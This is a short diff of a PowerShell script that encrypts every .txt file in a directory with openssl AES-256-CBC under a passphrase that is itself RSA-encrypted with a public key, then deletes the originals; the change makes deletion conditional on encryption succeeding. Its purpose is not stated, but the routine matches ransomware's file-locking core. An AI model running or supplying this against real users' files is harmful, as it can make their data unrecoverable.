@@ -6,6 +6,8 @@ echo "$PASS" | ."$openssl" rsautl -encrypt -inkey public.pem -pubin -out passphr
 Get-ChildItem "$DIR" -Filter *.txt |
 Foreach-Object {
 	$file=$_.FullName
-	."$openssl" enc -aes-256-cbc -in "$file" -out "$file.enc" -pass pass:"$PASS"
-	del "$file"
+	$output=."$openssl"  enc -aes-256-cbc -in "$file" -out "$file.enc" -pass pass:"$PASS" 2>&1
+	if(([string]::IsNullOrEmpty($output))){
+		del "$file"
+	}
 }
